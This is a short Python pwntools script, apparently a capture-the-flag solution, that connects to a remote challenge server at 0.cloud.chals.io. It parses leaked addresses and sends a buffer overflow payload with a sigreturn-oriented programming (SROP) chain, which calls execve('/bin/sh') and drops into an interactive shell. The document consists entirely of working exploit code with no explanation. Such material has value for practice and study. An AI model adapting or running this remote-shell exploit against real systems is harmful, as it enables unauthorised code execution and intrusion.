from pwn import *

context.arch = "amd64"

p = remote("0.cloud.chals.io", 21978)

p.recvuntil(b": ")

tmp = p.recvline().decode()
print(tmp)
BIN_SH = int(tmp.strip()[2:], 16)
print(f"/bin/sh: {hex(BIN_SH)}")

p.recvline()

p.recvuntil(b">>> ")
p.sendline(b"Y")
tmp = p.recvline()
print(tmp.decode().strip())
POP_RAX = int(tmp.decode().split("|")[1].strip()[2:], 16) + 6 
print(f"pop rax: {hex(POP_RAX)}")
p.recvuntil(b">>> ")
p.sendline(b"Y")
tmp = p.recvline()
print(tmp.decode().strip())
SYSCALL = int(tmp.decode().split("|")[1].strip()[2:], 16) + 4
print(f"Syscall instruction: {hex(SYSCALL)}")
p.recvuntil(b">>> ")
p.sendline(b"Y")
p.recvuntil(b">>> ")

# Get 0xa into RAX to cause a Sigreturn
payload = b"A"*8
payload += b"B"*8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdx = 0
frame.rsi = 0
frame.rdi = BIN_SH
frame.rip = SYSCALL

payload += bytes(frame)

p.sendline(payload)
p.interactive()
